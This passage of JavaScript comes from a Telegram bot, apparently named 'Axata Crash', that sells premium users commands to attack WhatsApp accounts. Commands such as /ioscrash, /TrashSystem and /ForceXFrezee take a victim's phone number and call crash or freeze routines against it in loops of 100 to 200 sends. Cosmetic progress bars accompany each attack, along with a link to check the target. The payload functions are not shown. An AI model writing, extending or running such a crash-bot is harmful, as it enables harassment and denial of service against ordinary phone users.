 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤  ☇
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 136; i++) {
            await chatFrezze(axata, target);
            await sleep(5000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/HomoAxata (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤  ☇
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 162; i++) {
            await HomoAxata(target);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE BUGS CRASH ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/TrashSystem (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 200; i++) {
            await TrashSystem(target, axata, Ptcp = true);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE BUGS FORCE ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/ForceXFrezee (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 158; i++) {
            await ForceXFrezee(target);
            await sleep(4000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE BUGS IPONGS ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/ioscrash (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 100; i++) {
            await ioscrash(target);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/Delayipongs (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 100; i++) {
            await Delayipongs(axata, target);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/crashNewIos (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 100; i++) {
            await crashNewIos(axata, target);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/iosinVisFC3 (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
